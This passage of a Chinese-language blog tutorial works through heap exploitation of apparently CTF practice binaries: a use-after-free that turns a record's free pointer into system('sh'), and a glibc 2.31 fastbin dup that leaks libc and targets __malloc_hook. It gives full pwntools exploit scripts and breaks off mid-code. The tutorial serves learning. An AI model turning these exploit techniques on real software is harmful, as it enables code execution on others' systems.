  io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show_record(index):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new_record(0,2,12, &quot;2222&quot;)</span><br><span class="line">new_record(1,1,20, 4444)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">del_record(0)</span><br><span class="line">del_record(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>我在上面加了 <code>gdb.attach</code> 這樣用來方便 debug<br>這個是剛 malloc 完之後的樣子:<br><img src="/img/2019/heap_exploitation/heap_raas_1.png" alt=""></p>
<p>這個是 free 後的樣子<br><img src="/img/2019/heap_exploitation/heap_raas_2.png" alt=""></p>
<p>透過上面的原始碼跟我們看 heap 的結果可以得知:</p>
<ol>
<li>如果 type 是 <code>int</code> 的話會 malloc 一個空間而已，所以 free 的時候理所當然只有一個 Chunk</li>
<li>如果 type 是 <code>string</code> 的畫會 malloc 兩個空間，所以 free 的時候會有兩個 Chunk</li>
</ol>
<p>我們可以利用這個特性進行 UAF<br>透過上面的 heap 截圖我們可以知道，new 一個新的 record 他會固定 malloc 一個大小跟 <code>record</code> 一樣的空間大小 (12)<br>再來判別後面是接 <code>int</code> 還是 <code>string</code> 前者直接放在原本的空間內，後者會 malloc 一個新的空間，並把原本放 int 數字的地方換成指向那個空間的 address<br>然後我們需要夠 <code>system(sh)</code>, 所以其型別一定要是 <code>string</code><br>這邊解題思路是看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3700">這邊</a>得出的</p>
<ul>
<li>创建chunk0（int）</li>
<li>创建chunk1（string）</li>
<li>free chunk1、chunk0，使得相对应的chunk进入fastbin</li>
<li>再次分配chunk2（string），由于fastbin的分配机制，会导致chunk2的内容写到chunk1的地方</li>
<li>这时写入chunk2的内容为system和sh</li>
<li>delete chunk1即调用了system(sh)<br>先把 exp 寫完再來 trace</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./raas&quot;)</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">context.endian = &#x27;little&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line">binELF = ELF(&quot;./raas&quot;)</span><br><span class="line"></span><br><span class="line">system_plt = binELF.plt[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line">def new_record(index, Type, length, value):</span><br><span class="line">    io.recvuntil(&quot;Act &gt;&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.send(str(index)+&#x27;\n&#x27;)</span><br><span class="line">    io.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">    io.sendline(str(Type))</span><br><span class="line">    if str(Type) == &quot;2&quot;:</span><br><span class="line">        io.recvuntil(&quot;Length &gt;&quot;)</span><br><span class="line">        io.sendline(str(length))</span><br><span class="line">    io.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">    io.sendline(str(value))</span><br><span class="line"></span><br><span class="line">def del_record(index):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show_record(index):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_record(0,1,16,4444)</span><br><span class="line">new_record(1,2,16,&quot;2222&quot;)</span><br><span class="line">del_record(1)</span><br><span class="line">del_record(0)</span><br><span class="line">new_record(2,2,12,&quot;sh\0\0&quot;+p32(system_plt))</span><br><span class="line">del_record(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>我把斷點下再剛 new 完的地方，del 完的地方和新的 new 後的地方<br>來看gdb長什麼樣子<br><img src="/img/2019/heap_exploitation/heap_raas_3.png" alt=""><br>可以看到都排根據 <code>record</code> 排得好好的，<code>size</code> 後面第一個 address 是 <code>print</code>，第二個是 <code>free</code><br>然後這邊先專注在 str 的存放 free 的位置上<br><img src="/img/2019/heap_exploitation/heap_raas_4.png" alt=""><br>這邊就是把他 free 掉，沒什麼<br><img src="/img/2019/heap_exploitation/heap_raas_5.png" alt=""><br>最後就是 UAF, 可以看到原本存放 <code>int_print</code> <code>int_free</code> 的地方變成了 <code>str_print</code> 和 <code>str_free</code> 了，而原本存放 <code>str_print</code> 的地方變成了 <code>sh</code>, 原本 <code>str_free</code> 則被複寫成 <code>system_plt</code></p>
<p>作法就是我們把 Length 設成跟 sizeof(record) 一樣大的空間，因為前面兩塊被 free 掉了，依照 fastbin 的規則就會提取一樣的 chunk 使用，這樣第一個 <code>int</code> 的 record chunk 就會被分配給後來的 <code>string</code> record 使用，而原本的 <code>string</code> 空間就會變成我們可控可複寫的地方了，最後的 <code>del</code> 的部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void do_del()</span><br><span class="line">&#123;</span><br><span class="line">    int idx = ask(&quot;Index&quot;);</span><br><span class="line">    records[idx]-&gt;free(records[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因為是複寫 <code>do_del</code> 舊的 <code>string</code> record 空間，所以 <code>idx</code> = 1, <code>records[idx]-&gt;free</code>的地方被複寫成 <code>system</code>, <code>records[idx]</code> 被等同於舊的 <code>string</code> record 開頭位置，這邊被複寫成 <code>sh\0\0</code><br>所以 <code>records[idx]-&gt;free(records[idx]</code> 實際上就是等於 <code>system(sh)</code><br><img src="/img/2019/heap_exploitation/heap_raas_6.png" alt=""><br>這是我自己寫的 64 位元版本的 raas exp code, 用同樣的 source code 改編譯成 64 位元版本的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./raas_64&quot;)</span><br><span class="line"></span><br><span class="line">context.endian = &#x27;little&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line">binELF = ELF(&quot;./raas_64&quot;)</span><br><span class="line"></span><br><span class="line">system_plt = binELF.plt[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line">def new_record(index, Type, length, value):</span><br><span class="line">    io.recvuntil(&quot;Act &gt;&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.send(str(index)+&#x27;\n&#x27;)</span><br><span class="line">    io.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">    io.sendline(str(Type))</span><br><span class="line">    if str(Type) == &quot;2&quot;:</span><br><span class="line">        io.recvuntil(&quot;Length &gt;&quot;)</span><br><span class="line">        io.sendline(str(length))</span><br><span class="line">    io.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">    io.sendline(str(value))</span><br><span class="line"></span><br><span class="line">def del_record(index):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show_record(index):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_record(0,1,16,4444)</span><br><span class="line">new_record(1,2,16,&quot;22222222&quot;)</span><br><span class="line">del_record(1)</span><br><span class="line">del_record(0)</span><br><span class="line">new_record(2,2,24,&quot;/bin/sh\0&quot;+p64(system_plt))</span><br><span class="line">del_record(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>基本上只要注意一下記憶體大小的空間就好了</p>
<h2 id="fastbin-dup-glibc-2-31-x64"><a href="#fastbin-dup-glibc-2-31-x64" class="headerlink" title="fastbin dup (glibc 2.31, x64)"></a>fastbin dup (glibc 2.31, x64)</h2><p>最近一直想把舊題目拿到現在的 libc 上做攻擊復現，主要還是看自己對現今 libc 對 heap 的防禦認知</p>
<p>這次挑在 ubuntu 20.04 LTS, glibc 2.31 的環境上打</p>
<p>這個版本的 libc 有幾個特點</p>
<ul>
<li>tcache 的 bk 欄位原本沒用，在這邊會放 tcache 位址當作 key，用來做 double free detect<br><img src="/img/2019/heap_exploitation/heap_tcache_double_free_detect.png" alt=""></li>
<li>因為有 tcache 的機制，所以我們只要把 tcache 填滿七個，第八個就會跑到 fastbin 裡面，在那裏面就可以繼續用 2.25 之前的 double free 手法</li>
<li>要注意的是，只要從 tcache 拿 chunk 出來的時候，就會順帶檢查同大小的 fastbin 有沒有 chunk，有的話就會順帶從 fastbin 放入 tcache</li>
</ul>
<p>首先塞滿 7 個 tcache 讓 fastbin 有東西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440)# chunk0</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk2</span><br><span class="line">create_note(0x60) # chunk3</span><br><span class="line">create_note(0x60) # chunk4</span><br><span class="line">create_note(0x60) # chunk5</span><br><span class="line">create_note(0x60) # chunk6</span><br><span class="line">create_note(0x60) # chunk7</span><br><span class="line">create_note(0x60) # chunk8</span><br><span class="line">create_note(0x60) # chunk9</span><br><span class="line">create_note(0x60) # chunk10</span><br><span class="line">del_note(0)</span><br><span class="line">del_note(1)</span><br><span class="line">del_note(2)</span><br><span class="line">del_note(3)</span><br><span class="line">del_note(4)</span><br><span class="line">del_note(5)</span><br><span class="line">del_note(6)</span><br><span class="line">del_note(7)</span><br><span class="line">del_note(8)</span><br><span class="line"># fastbin dup</span><br><span class="line">del_note(9)</span><br><span class="line">del_note(10)</span><br><span class="line">del_note(9)</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2019/heap_exploitation/heap_2.31_fastbin_dup_1.png" alt=""><br>這樣就輕易地做到我們在 2.25 之前所做到行為了</p>
<p>再來 leak libc base address 跟上面的步驟都一樣</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440)# chunk0</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk2</span><br><span class="line">create_note(0x60) # chunk3</span><br><span class="line">create_note(0x60) # chunk4</span><br><span class="line">create_note(0x60) # chunk5</span><br><span class="line">create_note(0x60) # chunk6</span><br><span class="line">create_note(0x60) # chunk7</span><br><span class="line">create_note(0x60) # chunk8</span><br><span class="line">create_note(0x60) # chunk9</span><br><span class="line">create_note(0x60) # chunk10</span><br><span class="line">del_note(0)</span><br><span class="line">create_note(0x440)# chunk11</span><br><span class="line">get_note(11)</span><br><span class="line">raw = io.recvline()</span><br><span class="line">main_arena = u64(raw[-7:-1].ljust(8, b&#x27;\x00&#x27;)) - 96</span><br><span class="line">log.info(&quot;main_arena is 0x%x&quot; %main_arena)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">libc_base = main_arena - 0x00000000001ebb80</span><br><span class="line">log.info(&quot;libc base address is 0x%x&quot; %libc_base)</span><br><span class="line">system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(&quot;system address is 0x%x&quot; %system)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2019/heap_exploitation/heap_2.31_fastbin_dup_2.png" alt=""></p>
<p>最後就是利用 main_arena 上面的位址做 0x7f 切斷做一個 fake chunk<br>但這邊要注意一點，前面說過 malloc chunk 之後會把 fastbin 上的 chunk 挪過去 tcache<br>所以如果是先 malloc tcache 裡的 chunk 再去做 0x7f 切割的話會變下面這樣（因為 tache 的 fd 指向 user_data 而 fastbin 是指向 heap_header 的差異所致）<br><img src="/img/2019/heap_exploitation/heap_2.31_fastbin_dup_3.png" alt=""></p>
<p>所以正確版是這樣<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fastbin_dup&quot;)</span><br><span class="line">binELF = ELF(&quot;./fastbin_dup&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.terminal = &#x27;bash&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create_note(size):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def get_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def set_note(idx, content):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_note(idx):</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def exit_note():</span><br><span class="line">    io.recvuntil(&quot;# &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">create_note(0x440)# chunk0</span><br><span class="line">create_note(0x60) # chunk1</span><br><span class="line">create_note(0x60) # chunk2</span><br><span class="line">create_note(0x60) # chunk3</span><br><span class="line">create_note(0x60) # chunk4</span><br><span class="line">create_note(0x60) # chunk5</span><br><span class="line">create_note(0x60) # chunk6</span><br><span class="line">create_note(0x60) # chunk7</span><br><span class="line">create_note(0x60) # chunk8</span><br><span class="line">create_note(0x60) # chunk9</span><br><span class="line">create_note(0x60) # chunk10</span><br><span class="line">del_note(0)</span><br><span class="line">create_note(0x440)# chunk11</span><br><span class="line">get_note(11)</span><br><span class="line">raw = io.recvline()</span><br><span class="line">main_arena = u64(raw[-7:-1].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">log.info(&quot;main_arena is 0x%x&quot; %main_arena)</span><br><span class="line">libc_base = main_arena - 0x00000000001ebb80 - 96</span><br><span class="line">system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">log.info(&quot;libc base address is 0x%x&quot; %libc_base)</span><br><span class="line">log.info(&quot;system is 0x%x&quot; %system)</span><br><span class="line">log.info(&quot;malloc_hook is 0x%x&quot; %malloc_hook)</span><br><span class="line">malloc_hook_s2b = malloc_hook - 0x2b - 8 + 0x10</span><br><span class="line"></span><br><span class="line">del_note(1)</span><br><span class="line">del_note(2)</span><br><span class="line">del_note(3)</span><br><span class="line">del_note(4)</span><br><span class="line">del_note(5)</span><br><span class="line">del_note(6)</span><br><span class="line">del_note(7)</span><br><span class="line">del_note(8)</span><br><span class="line">del_note(9)</span><br><span class="line">del_note(10)</span><br><span class="line">del_note(9)</span><br><span class="line"></span><br><span class="line">create_note(0x60) # chunk12</span><br><span class="line">create_note(0x60) # chunk13</span><br><span class="line">create_note(0x60) # chunk14</span><br><span class="line">create_note(0x60) # chunk15</span><br><span class="line">create_note(0x60) # chunk16</span><br><span class="line">create_note(0x60) # chunk17</span><br><span class="line">create_note(0x60) # chunk18</span><br><span class="line">create_note(0x60) # chunk19</span><br><span class="line">get_note(19)</span><br><span class="line"></span><br><span class="line">heap = u64(io.recvline()[-5:-1].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">log.info(&quot;tcache address is 0x%x&quot; %heap)</span><br><span class="line"></span><br><span class="line">set_note(19, p64(malloc_hook_s2b))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/2019/heap_exploitation/heap_2.31_fastbin_dup_4.png" alt=""><br>這邊還順便 leak 了 tcache 的 address<br>這邊給出最終 POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 